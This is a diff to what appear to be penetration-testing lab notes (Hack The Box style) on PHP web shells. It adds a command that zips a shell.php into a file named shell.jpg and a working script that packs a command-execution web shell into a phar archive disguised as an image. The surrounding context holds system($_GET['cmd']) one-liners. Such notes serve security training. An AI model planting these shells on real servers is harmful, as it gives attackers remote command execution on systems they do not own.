@@ -32,3 +32,21 @@ echo '<?php system($_GET["cmd"]); ?>' | base64
 <?php system('cat /flag.txt'); ?>
 <?php system($_REQUEST['cmd']); ?>
 ```
+```
+[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+### Phar Upload
+Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
+```
+Code: php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+```
+[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
